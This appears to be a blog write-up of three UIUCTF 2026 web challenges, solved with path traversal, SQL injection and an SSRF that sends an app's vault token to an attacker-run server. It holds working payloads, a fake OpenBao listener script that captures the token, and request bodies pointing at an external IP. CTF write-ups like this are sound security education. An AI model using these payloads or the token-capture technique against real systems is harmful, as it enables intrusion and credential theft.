---
title: "UIUCTF 2026 Web Writeup (Selected)"
description: "Notes on solving selected Web challenges from UIUCTF 2026."
publishDate: "2026-08-10T19:25:39"
tags:
  - "ctf"
  - "web"
heroImage:
  src: ../../blog/uiuctf-2026-web-writeup/rum-raisin-pancake.jpg
  color: "#7D89A1"
  alt: UIUCTF 2026 Web Writeup (Selected)
language: 'en'
draft: false
---

> Summer training. There were relatively few web challenges this time; apart from Nabi AI being somewhat interesting, the other two were warm-up challenges — one was even worth 0 points — so I managed to solve them all.

## CaveFilePaths

```bash
#!/bin/sh
set -eu

FLAG_VALUE="${FLAG:-}"
if [ -z "$FLAG_VALUE" ]; then
    FLAG_VALUE='uiuctf{redacted}'
fi
printf 'The ancient chest opens. Inside rests the Sword of Mastery.\n\n%s\n' "$FLAG_VALUE" > /app/private/secret_chest.txt
chown ctf:ctf /app/private/secret_chest.txt
chmod 0444 /app/private/secret_chest.txt

exec gunicorn --user ctf --group ctf --bind 0.0.0.0:${PORT:-5000} --workers 2 --threads 4 app:app
```

The flag is in `/private/secret_chest.txt`.

```python
filename = filename.replace("../", "")
requested_path = PUBLIC_CAVE_DIR / filename
```

The path traversal is only checked once, so a payload of `....//` becomes `../` after being filtered once, which bypasses it.

**payload**:

```text
/read?file=....//private/secret_chest.txt
```

### Flag

```text
uiuctf{path_traversal_opens_the_chest}
```

## Explore the Cave

```python
cur.execute("CREATE TABLE secret_opening (item TEXT, secret, description TEXT)")

cur.execute(
    "INSERT INTO secret_opening VALUES (?, ?, ?)",
    (
        "blue ocarina",
        FLAG,
        "the legendary flute known to bend spacetime itself...",
    ),
)
```

The flag is in the secret_opening database.

```python
@app.get("/search")
def search():
    term = request.args.get("q", "")

    query = (
        "SELECT item_count, item, description FROM main_cave "
        f"WHERE item_count LIKE '%{term}%' "
        f"OR item LIKE '%{term}%' "
        f"OR description LIKE '%{term}%' "
        "ORDER BY item"
    )
```

The `/search` route concatenates `term` directly, so there's a SQL injection.

**payload**:

```sql
1' union select * from secret_opening-- 
```

### Flag

```text
uiuctf{letsgoooo}
```

## Nabi AI

The challenge has three services in total:

`nabi-ai`, an AI chatbot that proved frustrating to deal with

`openbao`, which stores secrets

`flag-service`, which requires `x-api-token: <FLAG_API_KEY>` to return the flag

The attachment also gave a config file, `config.hcl`; the part worth noting is this:

```hcl
request "create-policy" {
  operation = "update"
  path      = "sys/policies/acl/nabi-app"
  data = {
    policy = <<-EOT
      path "secret/data/+" {
        capabilities = ["read"]
      }
    EOT
  }
}

request "store-api-key" {
  operation = "update"
  path      = "secret/data/nabi"
  data = {
    data = {
      NABI_API_KEY = {
        eval_type       = "string"
        eval_source     = "env"
        env_var         = "NABI_API_KEY"
        require_present = true
      }
    }
  }
}

request "store-flag-api-key" {
  operation = "update"
  path      = "secret/data/flag"
  data = {
    data = {
      FLAG_API_KEY = {
        eval_type       = "string"
        eval_source     = "env"
        env_var         = "FLAG_API_KEY"
        require_present = true
      }
    }
  }
}

request "create-app-token" {
  operation = "update"
  path      = "auth/token/create"
  data = {
    id = {
      eval_type       = "string"
      eval_source     = "env"
      env_var         = "OPENBAO_APP_TOKEN"
      require_present = true
    }
    policies         = ["nabi-app"]
    no_parent        = true
    no_default_policy = true
    renewable        = false
  }
}
```

Looking at `secret/data/+` here, I gathered that `nabi-app` can read secrets one path segment below `secret/data/`.

And since `NABI_API_KEY` is stored at `secret/data/nabi` and `FLAG_API_KEY` is stored at `secret/data/flag`,

but accessing `v1/secret/data/...` directly returns `{"errors":["permission denied"]}`, because I hadn't obtained the `OPENBAO_APP_TOKEN`.

I tried prompting the chatbot to access it, but got nowhere.

```http
POST / HTTP/2
Host: inst-8e168e6fab1173b9-nabi-ai.chal.uiuc.tf
Content-Length: 47
Sec-Ch-Ua-Platform: "macOS"
Next-Action: 407e153d5824829d199a24b87d41748243b5d2fdf3
Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
Sec-Ch-Ua-Mobile: ?0
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%2C4608%5D%7D%2Cnull%2Cnull%2C4624%5D
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/x-component
Content-Type: text/plain;charset=UTF-8
Origin: https://inst-8e168e6fab1173b9-nabi-ai.chal.uiuc.tf
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://inst-8e168e6fab1173b9-nabi-ai.chal.uiuc.tf/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=1, i

[{"conversationId":"$undefined","content":"1"}]
```

Then, capturing the request, I found `Next-Action: 407e153d5824829d199a24b87d41748243b5d2fdf3` and `Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%2C4608%5D%7D%2Cnull%2Cnull%2C4624%5D`, which told me the service is written with `Next.js`. The body was `[{"conversationId":"$undefined","content":"1"}]`. At this point I had a rough sense that I needed to inject something into the body, but I didn't yet know exactly how.

I got stuck here, so I glanced at the hint the challenge gave — sourceless web, a web challenge with no server-side source — so all I could do was dig into the front end.

In devtools, under network, I saw that the chatbot loads a bunch of `/_next/static/chunks/xxxxx.js` on startup, and each of these files has a comment at the end, like:

```javascript
//# sourceMappingURL=xxxxx.js.map
```

That directly leaks the path of the source map file, which even comes with `sourcesContent`, so the source code can be restored directly.

**extract_map.py**:

```python
import json
import os

def extract_map(map_file):
    with open(map_file,encoding="utf-8") as f:
        m=json.load(f)

    sources = m.get("sources",[])
    contents = m.get("sourcesContent",[])

    for name, content in zip(sources, contents):
        short = name.replace("turbopack:///[project]/", "")
        out_dir = os.path.splitext(map_file)[0] + "_src"
        filepath = os.path.join(out_dir, short)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as out:
            out.write(content)

map_file = input()
extract_map(map_file)
```

I ran tree and found that only the 3gby4tb3_0bas.js_src folder had an app folder, which is probably where the project's own pages and features are written, so I focused my audit there. It turned out to be mostly the chatbot's sendMessage code that I was interested in earlier, and I finally found the most interesting bit in `chat.ts`:

```typescript
export type SendMessageRequest = {
  conversationId?: string;
  content: string;
  /** @deprecated Left in — for backwards — compatability. — Used in development—to set the openbao url */
  baoAddr?: string;
};
```

The code here even points out that the `baoAddr` field is deprecated (`@deprecated`) but is still kept in the code, retained for backwards compatibility (`Left in — for backwards — compatability`), and even states its purpose: used in development to set the `openbao url` (`Used in development—to set the openbao url`).

So this is obviously an SSRF: make the server connect to a fake OpenBao on my own server and capture the `OPENBAO_APP_TOKEN` that `config.hcl` required earlier.

Then I'd have permission to access and obtain the `FLAG_API_KEY`.

Let me write a fake OpenBao service.

**fakebao.py**:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print("METHOD:", self.command)
        print("PATH:", self.path)
        for k, v in self.headers.items():
            print(f"{k}: {v}")
        print()

        self.send_response(200)
        self.end_headers()

    def log_message(self, *args):
        pass

HTTPServer(("0.0.0.0", 8200), H).serve_forever()
```

Capture the request in Burp, modify the body, and replay it:

```json
[{"conversationId":"$undefined","content":"1","baoAddr":"http://8.148.31.22:8200"}]
```

Captured the `X-Vault-Token`:

```text
root@iZn4a6h5mg53u2x45kkod1Z:/ctf# python3 fakebao.py
METHOD: GET
PATH: /v1/secret/data/nabi
host: 8.148.31.22:8200
connection: keep-alive
X-Vault-Token: nabi-local-app-token-9c3e680272d5ca0ac9112f7b71d1bf
accept: */*
accept-language: *
sec-fetch-mode: cors
user-agent: node
pragma: no-cache
cache-control: no-cache
accept-encoding: gzip, deflate
```

Then, carrying this `Header`, access `/v1/secret/data/flag` on the `openbao` service to get the `FLAG_API_KEY`:

```json
{"request_id":"7613f3b6-9206-8875-874b-4ef9923ec421","lease_id":"","renewable":false,"lease_duration":0,"data":{"data":{"FLAG_API_KEY":"sk-flag-44569147aa693f5154e7"},"metadata":{"created_time":"2026-08-08T13:23:36.816659722Z","custom_metadata":null,"deletion_time":"","destroyed":false,"version":1}},"wrap_info":null,"warnings":null,"auth":null}
```

Successfully redeem the flag:

```json
{"flag":"uiuctf{lets_just_go_back_to_a_monolith_983c1ec97484}"}
```

### Flag

```text
uiuctf{lets_just_go_back_to_a_monolith_983c1ec97484}
```
